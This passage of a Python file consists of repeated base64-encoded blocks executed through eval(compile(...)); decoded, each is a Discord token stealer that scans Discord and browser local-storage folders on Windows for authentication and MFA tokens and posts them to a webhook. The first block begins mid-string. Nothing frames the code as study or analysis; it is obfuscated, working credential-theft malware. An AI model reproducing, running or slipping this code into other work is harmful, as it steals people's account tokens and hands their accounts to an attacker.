J21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszNH0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszM30iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszMn0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

